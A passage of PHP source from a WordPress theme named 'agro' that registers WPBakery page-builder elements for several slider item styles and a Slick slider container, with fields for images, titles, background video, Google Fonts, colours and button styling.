                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('left', 'agro') => 'text-left',
                            esc_html__('center', 'agro') => 'text-center',
                            esc_html__('right', 'agro') => 'text-right',
                        )
                    ),
                    // video
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'video',
                        'heading' => esc_html__('Add background video', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                        'group' => esc_html__('Video', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4',
                    ),
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'mute',
                        'heading' => esc_html__('Mute', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                        'group' => esc_html__('Video', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4',
                        'dependency' => array(
                            'element' => 'video',
                            'not_empty' => true
                        )
                    ),
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'loop',
                        'heading' => esc_html__('Loop', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                        'group' => esc_html__('Video', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4',
                        'dependency' => array(
                            'element' => 'video',
                            'not_empty' => true
                        )
                    ),
                    array(
                        'type' => 'textarea',
                        'param_name' => 'videosrc',
                        'heading' => esc_html__('Video source', 'agro'),
                        'description' => esc_html__('Add local video url to here.', 'agro'),
                        'group' => esc_html__('Video', 'agro'),
                        'dependency' => array(
                            'element' => 'video',
                            'not_empty' => true
                        )
                    ),
                    // fonts
                    array(
                        'type' => 'nt_spacer',
                        'param_name' => 'fonts_spacer',
                        'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                        'group' => esc_html__('Fonts', 'agro')
                    ),
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'usefonts',
                        'heading' => esc_html__('Use Google Fonts?', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                        'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                        'group' => esc_html__('Fonts', 'agro'),
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Heading tag', 'agro'),
                        'param_name' => 'htag',
                        'group' => esc_html__('Fonts', 'agro'),
                        'value' => array(
                            esc_html__('Select tag', 'agro') => '',
                            esc_html__('h1', 'agro') => 'h1',
                            esc_html__('h2', 'agro') => 'h2',
                            esc_html__('h3', 'agro') => 'h3',
                            esc_html__('h4', 'agro') => 'h4',
                            esc_html__('h5', 'agro') => 'h5',
                            esc_html__('h6', 'agro') => 'h6',
                            esc_html__('div', 'agro') => 'div',
                            esc_html__('p', 'agro') => 'p',
                            esc_html__('span', 'agro') => 'span'
                        )
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'tsize',
                        'heading' => esc_html__('Font size', 'agro'),
                        'group' => esc_html__('Fonts', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'lheight',
                        'heading' => esc_html__('Line height', 'agro'),
                        'group' => esc_html__('Fonts', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'google_fonts',
                        'param_name' => 'google_fonts',
                        'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                        'group' => esc_html__('Fonts', 'agro'),
                        'settings' => array(
                            'fields' => array(
                                'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                                'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                            )
                        ),
                        'dependency' => array(
                            'element' => 'usefonts',
                            'not_empty' => true
                        )
                    ),
                    // color
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'stclr',
                        'heading' => esc_html__('Subtitle color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4 pt15'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'tclr',
                        'heading' => esc_html__('Title color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'thclr',
                        'heading' => esc_html__('Thin title color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'dclr',
                        'heading' => esc_html__('Description color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4'
                    ),
                    array(
                        'type' => 'nt_spacer',
                        'param_name' => 'btn_spacer',
                        'heading' => esc_html__('Button Customize', 'agro'),
                        'group' => esc_html__('Color', 'agro')
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Button type', 'agro'),
                        'param_name' => 'btntype',
                        'edit_field_class' => 'vc_col-sm-4',
                        'group' => esc_html__('Color', 'agro'),
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('Round', 'agro') => 'btn-round',
                            esc_html__('Square', 'agro') => 'btn-square',
                            esc_html__('Rounded', 'agro') => 'btn-rounded'
                        )
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Button style', 'agro'),
                        'param_name' => 'btnstyle',
                        'edit_field_class' => 'vc_col-sm-4',
                        'group' => esc_html__('Color', 'agro'),
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('Outline to Solid', 'agro') => 'custom-btn--style-3',
                            esc_html__('Solid to Outline', 'agro') => 'custom-btn--style-4'
                        )
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Button size', 'agro'),
                        'param_name' => 'btnsize',
                        'edit_field_class' => 'vc_col-sm-4',
                        'group' => esc_html__('Color', 'agro'),
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('Big', 'agro') => 'custom-btn--big',
                            esc_html__('Medium', 'agro') => 'custom-btn--medium',
                            esc_html__('Small', 'agro') => 'custom-btn--small'
                        )
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr2',
                        'group' => esc_html__('Color', 'agro'),
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnbg',
                        'heading' => esc_html__('Button background', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnhvrbg',
                        'heading' => esc_html__('Hover button background', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr3',
                        'group' => esc_html__('Color', 'agro'),
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnclr',
                        'heading' => esc_html__('Button title color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnhvrclr',
                        'heading' => esc_html__('Hover button title color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr4',
                        'group' => esc_html__('Color', 'agro'),
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnbrd',
                        'heading' => esc_html__('Button border color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnhvrbrd',
                        'heading' => esc_html__('Hover button border color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'nt_spacer',
                        'param_name' => 'btn_spacer',
                        'heading' => esc_html__('Play Button Customize', 'agro'),
                        'group' => esc_html__('Color', 'agro')
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'playiconclr',
                        'heading' => esc_html__('Play icon color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'playiconbg',
                        'heading' => esc_html__('Play icon background', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'playbrd',
                        'heading' => esc_html__('Play icon border', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4'
                    )
                )
            )
        );
    }
    if (class_exists('WPBakeryShortCode')) {
        class WPBakeryShortCode_Agro_Slider_Item2 extends WPBakeryShortCode
        {
        }
    }
}

/*******************************/
/* Slider item Style 3
/******************************/
if (!function_exists('agro_slider_item3_integrateWithVC')) {
    add_action('vc_before_init', 'agro_slider_item3_integrateWithVC');
    function agro_slider_item3_integrateWithVC()
    {
        vc_map(
            array(
                'name' => esc_html__('Slider Item Style 3', 'agro'),
                'base' => 'agro_slider_item3',
                "as_child" => array('only' => 'agro_slider_container'),
                "content_element" => true,
                "show_settings_on_create"  => true,
                'icon' => 'nt_logo',
                'category' => 'AGRO',
                'params' => array(
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'img',
                        'heading' => esc_html__('Slider image', 'agro')
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'delay',
                        'heading' => esc_html__('Change Slide Delay', 'agro'),
                        'description' => esc_html__('Use simple number.', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4'
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr0'
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'subtitle',
                        'heading' => esc_html__('Slider subtitle', 'agro')
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'title',
                        'heading' => esc_html__('Slider title', 'agro')
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'spantitle',
                        'heading' => esc_html__('Slider span title', 'agro')
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr1'
                    ),
                    array(
                        'type' => 'vc_link',
                        'param_name' => 'link',
                        'heading' => esc_html__('Slider button link and title', 'agro')
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr2'
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Text Content Column Width', 'agro'),
                        'param_name' => 'xl',
                        'edit_field_class' => 'vc_col-sm-6',
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('6 column', 'agro') => 'col-xl-6',
                            esc_html__('7 column', 'agro') => 'col-xl-7',
                            esc_html__('8 column', 'agro') => 'col-xl-8',
                            esc_html__('9 column', 'agro') => 'col-xl-9',
                            esc_html__('10 column', 'agro') => 'col-xl-10',
                            esc_html__('11 column', 'agro') => 'col-xl-11',
                            esc_html__('12 column', 'agro') => 'col-xl-12'
                        )
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Text Alignment', 'agro'),
                        'param_name' => 'alignment',
                        'edit_field_class' => 'vc_col-sm-6',
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('left', 'agro') => 'text-left',
                            esc_html__('center', 'agro') => 'text-center',
                            esc_html__('right', 'agro') => 'text-right',
                        )
                    ),
                    // video
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'video',
                        'heading' => esc_html__('Add background video', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                        'group' => esc_html__('Video', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4',
                    ),
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'mute',
                        'heading' => esc_html__('Mute', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                        'group' => esc_html__('Video', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4',
                        'dependency' => array(
                            'element' => 'video',
                            'not_empty' => true
                        )
                    ),
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'loop',
                        'heading' => esc_html__('Loop', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                        'group' => esc_html__('Video', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4',
                        'dependency' => array(
                            'element' => 'video',
                            'not_empty' => true
                        )
                    ),
                    array(
                        'type' => 'textarea',
                        'param_name' => 'videosrc',
                        'heading' => esc_html__('Video source', 'agro'),
                        'description' => esc_html__('Add local video url to here.', 'agro'),
                        'group' => esc_html__('Video', 'agro'),
                        'dependency' => array(
                            'element' => 'video',
                            'not_empty' => true
                        )
                    ),
                    // fonts
                    array(
                        'type' => 'nt_spacer',
                        'param_name' => 'fonts_spacer',
                        'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                        'group' => esc_html__('Fonts', 'agro')
                    ),
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'usefonts',
                        'heading' => esc_html__('Use Google Fonts?', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                        'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                        'group' => esc_html__('Fonts', 'agro'),
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Heading tag', 'agro'),
                        'param_name' => 'htag',
                        'group' => esc_html__('Fonts', 'agro'),
                        'value' => array(
                            esc_html__('Select tag', 'agro') => '',
                            esc_html__('h1', 'agro') => 'h1',
                            esc_html__('h2', 'agro') => 'h2',
                            esc_html__('h3', 'agro') => 'h3',
                            esc_html__('h4', 'agro') => 'h4',
                            esc_html__('h5', 'agro') => 'h5',
                            esc_html__('h6', 'agro') => 'h6',
                            esc_html__('div', 'agro') => 'div',
                            esc_html__('p', 'agro') => 'p',
                            esc_html__('span', 'agro') => 'span'
                        )
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'tsize',
                        'heading' => esc_html__('Font size', 'agro'),
                        'group' => esc_html__('Fonts', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'lheight',
                        'heading' => esc_html__('Line height', 'agro'),
                        'group' => esc_html__('Fonts', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'google_fonts',
                        'param_name' => 'google_fonts',
                        'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                        'group' => esc_html__('Fonts', 'agro'),
                        'settings' => array(
                            'fields' => array(
                                'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                                'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                            )
                        ),
                        'dependency' => array(
                            'element' => 'usefonts',
                            'not_empty' => true
                        )
                    ),
                    // color
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'stclr',
                        'heading' => esc_html__('Subtitle color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4 pt15'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'tclr',
                        'heading' => esc_html__('Title color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'spantitleclr',
                        'heading' => esc_html__('Span title color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'dclr',
                        'heading' => esc_html__('Description color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4'
                    ),
                    array(
                        'type' => 'nt_spacer',
                        'param_name' => 'btn_spacer',
                        'heading' => esc_html__('Button Customize', 'agro'),
                        'group' => esc_html__('Color', 'agro')
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Button type', 'agro'),
                        'param_name' => 'btntype',
                        'edit_field_class' => 'vc_col-sm-4',
                        'group' => esc_html__('Color', 'agro'),
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('Round', 'agro') => 'btn-round',
                            esc_html__('Square', 'agro') => 'btn-square',
                            esc_html__('Rounded', 'agro') => 'btn-rounded'
                        )
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Button style', 'agro'),
                        'param_name' => 'btnstyle',
                        'edit_field_class' => 'vc_col-sm-4',
                        'group' => esc_html__('Color', 'agro'),
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('Outline to Solid', 'agro') => 'custom-btn--style-3',
                            esc_html__('Solid to Outline', 'agro') => 'custom-btn--style-4'
                        )
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Button size', 'agro'),
                        'param_name' => 'btnsize',
                        'edit_field_class' => 'vc_col-sm-4',
                        'group' => esc_html__('Color', 'agro'),
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('Big', 'agro') => 'custom-btn--big',
                            esc_html__('Medium', 'agro') => 'custom-btn--medium',
                            esc_html__('Small', 'agro') => 'custom-btn--small'
                        )
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr2',
                        'group' => esc_html__('Color', 'agro'),
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnbg',
                        'heading' => esc_html__('Button background', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnhvrbg',
                        'heading' => esc_html__('Hover button background', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr3',
                        'group' => esc_html__('Color', 'agro'),
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnclr',
                        'heading' => esc_html__('Button title color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnhvrclr',
                        'heading' => esc_html__('Hover button title color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr4',
                        'group' => esc_html__('Color', 'agro'),
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnbrd',
                        'heading' => esc_html__('Button border color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'btnhvrbrd',
                        'heading' => esc_html__('Hover button border color', 'agro'),
                        'group' => esc_html__('Color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    )
                )
            )
        );
    }
    if (class_exists('WPBakeryShortCode')) {
        class WPBakeryShortCode_Agro_Slider_Item3 extends WPBakeryShortCode
        {
        }
    }
}

/*******************************/
/* Slider item Style 4
/******************************/
if (!function_exists('agro_slider_item4_integrateWithVC')) {
    add_action('vc_before_init', 'agro_slider_item4_integrateWithVC');
    function agro_slider_item4_integrateWithVC()
    {
        vc_map(
            array(
                'name' => esc_html__('Slider Item Style 4', 'agro'),
                'base' => 'agro_slider_item4',
                "as_child" => array('only' => 'agro_slider_container'),
                "content_element" => true,
                "show_settings_on_create"  => true,
                'icon' => 'nt_logo',
                'category' => 'AGRO',
                'params' => array(
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'img',
                        'heading' => esc_html__('Slider image', 'agro')
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'delay',
                        'heading' => esc_html__('Change Slide Delay', 'agro'),
                        'description' => esc_html__('Use simple number.', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4'
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'spantitle1',
                        'heading' => esc_html__('Slider span title 1', 'agro')
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'spantitleclr1',
                        'heading' => esc_html__('Slider span title 1 color', 'agro')
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'spantitle2',
                        'heading' => esc_html__('Slider span title 2', 'agro')
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'spantitleclr2',
                        'heading' => esc_html__('Slider span title 2 color', 'agro')
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'vurl',
                        'heading' => esc_html__('Video Url', 'agro'),
                        'description' => esc_html__('e.g : http://player.vimeo.com/video/44309170', 'agro')
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Text Content Column Width', 'agro'),
                        'param_name' => 'lg',
                        'edit_field_class' => 'vc_col-sm-6',
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('6 column', 'agro') => 'col-lg-6',
                            esc_html__('7 column', 'agro') => 'col-lg-7',
                            esc_html__('8 column', 'agro') => 'col-lg-8',
                            esc_html__('9 column', 'agro') => 'col-lg-9',
                            esc_html__('10 column', 'agro') => 'col-lg-10',
                            esc_html__('11 column', 'agro') => 'col-lg-11',
                            esc_html__('12 column', 'agro') => 'col-lg-12'
                        )
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Text Alignment', 'agro'),
                        'param_name' => 'alignment',
                        'edit_field_class' => 'vc_col-sm-6',
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('left', 'agro') => 'text-left',
                            esc_html__('center', 'agro') => 'text-center',
                            esc_html__('right', 'agro') => 'text-right',
                        )
                    ),
                    // video
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'video',
                        'heading' => esc_html__('Add background video', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                        'group' => esc_html__('Background Video', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4',
                    ),
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'mute',
                        'heading' => esc_html__('Mute', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                        'group' => esc_html__('Background Video', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4',
                        'dependency' => array(
                            'element' => 'video',
                            'not_empty' => true
                        )
                    ),
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'loop',
                        'heading' => esc_html__('Loop', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                        'group' => esc_html__('Background Video', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4',
                        'dependency' => array(
                            'element' => 'video',
                            'not_empty' => true
                        )
                    ),
                    array(
                        'type' => 'textarea',
                        'param_name' => 'videosrc',
                        'heading' => esc_html__('Video source', 'agro'),
                        'description' => esc_html__('Add local video url to here.', 'agro'),
                        'group' => esc_html__('Background Video', 'agro'),
                        'dependency' => array(
                            'element' => 'video',
                            'not_empty' => true
                        )
                    ),
                    // fonts
                    array(
                        'type' => 'nt_spacer',
                        'param_name' => 'fonts_spacer',
                        'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                        'group' => esc_html__('Fonts', 'agro')
                    ),
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'usefonts',
                        'heading' => esc_html__('Use Google Fonts?', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                        'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                        'group' => esc_html__('Fonts', 'agro'),
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Heading tag', 'agro'),
                        'param_name' => 'htag',
                        'group' => esc_html__('Fonts', 'agro'),
                        'value' => array(
                            esc_html__('Select tag', 'agro') => '',
                            esc_html__('h1', 'agro') => 'h1',
                            esc_html__('h2', 'agro') => 'h2',
                            esc_html__('h3', 'agro') => 'h3',
                            esc_html__('h4', 'agro') => 'h4',
                            esc_html__('h5', 'agro') => 'h5',
                            esc_html__('h6', 'agro') => 'h6',
                            esc_html__('div', 'agro') => 'div',
                            esc_html__('p', 'agro') => 'p',
                            esc_html__('span', 'agro') => 'span'
                        )
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'tsize',
                        'heading' => esc_html__('Font size', 'agro'),
                        'group' => esc_html__('Fonts', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'lheight',
                        'heading' => esc_html__('Line height', 'agro'),
                        'group' => esc_html__('Fonts', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'google_fonts',
                        'param_name' => 'google_fonts',
                        'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                        'group' => esc_html__('Fonts', 'agro'),
                        'settings' => array(
                            'fields' => array(
                                'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                                'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                            )
                        ),
                        'dependency' => array(
                            'element' => 'usefonts',
                            'not_empty' => true
                        )
                    )
                )
            )
        );
    }
    if (class_exists('WPBakeryShortCode')) {
        class WPBakeryShortCode_Agro_Slider_Item4 extends WPBakeryShortCode
        {
        }
    }
}




/*******************************/
/* Slider Container
/******************************/
if (!function_exists('agro_slick_slider_container_integrateWithVC')) {
    add_action('vc_before_init', 'agro_slick_slider_container_integrateWithVC');
    function agro_slick_slider_container_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Slick Slider Container', 'agro'),
        'base' => 'agro_slick_slider_container',
        "as_parent" => array('only' => 'agro_slick_slider_item1'),
        "content_element" => true,
        "show_settings_on_create" => true,
        "is_container" => true,
        "js_view" => 'VcColumnView',
        'class' => 'vc_nt-nested-container',
        'icon' => 'nt_logo',
        'category'=> 'AGRO',
        'params'   => array(
            array(
                'type' => 'textfield',
                'param_name' => 'speed',
                'heading' => esc_html__('Delay', 'agro'),
                'description' => esc_html__('Use simple number.default 1200.', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
        )));
    }
}

if (class_exists('WPBakeryShortCodesContainer')) {
    class WPBakeryShortCode_Agro_Slick_Slider_Container extends WPBakeryShortCodesContainer
    {
    }
}

/*******************************/
/* Slider item Style 1
/******************************/
if (!function_exists('agro_slick_slider_item1_integrateWithVC')) {
    add_action('vc_before_init', 'agro_slick_slider_item1_integrateWithVC');
    function agro_slick_slider_item1_integrateWithVC()
    {
        vc_map(
            array(
                'name' => esc_html__('Slick Slider Item', 'agro'),
                'base' => 'agro_slick_slider_item1',
                "as_child" => array('only' => 'agro_slick_slider_container'),
                "content_element" => true,
                "show_settings_on_create"  => true,
                'icon' => 'nt_logo',
                'category' => 'AGRO',
                'params' => array(
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Item Style', 'agro'),
                        'param_name' => 'style',
                        'edit_field_class' => 'vc_col-sm-6',
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('Style 1', 'agro') => '1',
                            esc_html__('Style 2', 'agro') => '2',
                            esc_html__('Style 3', 'agro') => '3',
                        )
                    ),
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'img',
                        'heading' => esc_html__('Slider Background image', 'agro')
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Background position', 'agro'),
                        'param_name' => 'bgpos',
                        'description' => esc_html__('Select background-position', 'agro'),
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('center', 'agro') => 'center',
                            esc_html__('left', 'agro') => 'left',
                            esc_html__('right', 'agro') => 'right',
                            esc_html__('top', 'agro') => 'top',
                            esc_html__('bottom', 'agro') => 'bottom',
                            esc_html__('center-left', 'agro') => 'center left',
                            esc_html__('center-right', 'agro') => 'center right',
                            esc_html__('center-top', 'agro') => 'center top',
                            esc_html__('center-bottom', 'agro') => 'center bottom',
                            esc_html__('left-center', 'agro') => 'left center',
                            esc_html__('left-top', 'agro') => 'left top',
                            esc_html__('left-bottom', 'agro') => 'left bottom',
                            esc_html__('right-center', 'agro') => 'right center',
                            esc_html__('right-top', 'agro') => 'right top',
                            esc_html__('right-bottom', 'agro') => 'right bottom',
                            esc_html__('top-center', 'agro') => 'top center',
                            esc_html__('top-left', 'agro') => 'top left',
                            esc_html__('top-right', 'agro') => 'top right',
                            esc_html__('bottom-center', 'agro') => 'bottom center',
                            esc_html__('bottom-left', 'agro') => 'bottom left',
                            esc_html__('bottom-right', 'agro') => 'bottom right',
                            esc_html__('Custom position', 'agro') => 'custom',
                        ),
                        'edit_field_class' => 'vc_col-sm-6'
                    ),
                    array(
                        'type' => 'textfield',
                        'heading' => esc_html__('Custom background position', 'agro'),
                        'param_name' => 'custom_bgpos',
                        'description' => esc_html__('Set background image position.e.g: 100% or 400px or 300px 500px or 50% 50% or .....etc', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                        'dependency' => array(
                            'element' => 'bgpos',
                            'value' => 'custom'
                        )
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'title',
                        'heading' => esc_html__('Slider title', 'agro')
                    ),
                    array(
                        'type' => 'textarea',
                        'param_name' => 'desc',
                        'heading' => esc_html__('Slider description', 'agro')
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr0'
                    ),
                    array(
                        'type' => 'vc_link',
                        'param_name' => 'link',
                        'heading' => esc_html__('Slider button link and title', 'agro')
                    ),
                    array(
                        'type' => 'nt_hr',
                        'param_name' => 'hr1'
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('Text Content Column Width', 'agro'),
                        'param_name' => 'xl',
                        'edit_field_class' => 'vc_col-sm-6',
                        'value' => array(
